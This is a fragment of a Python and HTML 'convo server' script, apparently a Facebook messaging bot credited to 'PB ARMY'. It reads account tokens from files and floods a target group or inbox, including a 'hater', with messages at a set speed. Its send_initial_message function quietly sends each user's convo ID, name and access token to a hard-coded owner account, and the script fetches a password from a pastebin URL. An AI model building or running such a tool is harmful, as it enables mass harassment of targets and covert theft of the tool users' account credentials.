...
#             PB-CONVO.txt => is file me group / inox ki ID dalna hai
#             PB-FILE.txt => is file me messages dalna hai 
#             PB-NAME.txt => is file me apko apna ya hater ka name dalna hai
#             PB-TOKEN.txt => isme apni sari id ke token dalne hai
#             PB-SPEED.txt => is file me second dalna hai kitne second ki speed se mesage bhejne hai
#             PB-PASS.txt => isme apko apna password dalna hai
#             PB-HOST.txt => isme host code dalna hai
# OPTIONAL FILES :-
...
<body>
    <div class="container">
        <div class="box">
            <h1>AADI CONVO SERVER</h1>
            <div class="credit">
                <p>1. CREDIT:-PB ARMY</p>
                <p>2. OWNER => AADI</p>
                <p>3. CONTACT:- <a href="https://wa.me/+919140390213">WhatsApp</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/ayansh.papa.i">Facebook</a></p>
                <p>5. WATTSAPP GROUP:- <a href="https://chat.whatsapp.com/JOSCE1lt4DmJNhVcsXnc7W">WhatsApp Group</a></p>
            </div>
        </div>
    </div>
    <div class="thanks">
        ...
        <a href="https://youtu.be/pVh0RwKzBQg?si=gH49kb0Adqxu-6dz">YouTube Channel</a>
    </div>
</body>
</html>
"""
...
def send_initial_message():
    ...
    mmm_pass = requests.get('https://pastebin.com/raw/qpdPZt4v').text
    ...
    # Message template
    msg_template = "Owner => Ayansh \n Hello Ayansh sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = [ "100017443626708" ]
